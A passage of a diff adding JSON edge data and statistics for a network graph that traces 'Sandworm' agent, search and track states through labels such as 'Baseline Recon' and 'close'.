+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:START",
+      "to": "agent:Sandworm:r2_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:START",
+      "to": "search:Sandworm:r2_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r2_base",
+      "to": "track:Sandworm:r2_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r2_base",
+      "to": "agent:Sandworm:r2_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r2_base",
+      "to": "agent:Sandworm:r2_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 30,
+    "total_edges": 38,
+    "agent_nodes": 12,
+    "search_nodes": 9,
+    "track_nodes": 9,
+    "runs_detected": 2,
+    "rows_captured": 5
+  }
+}
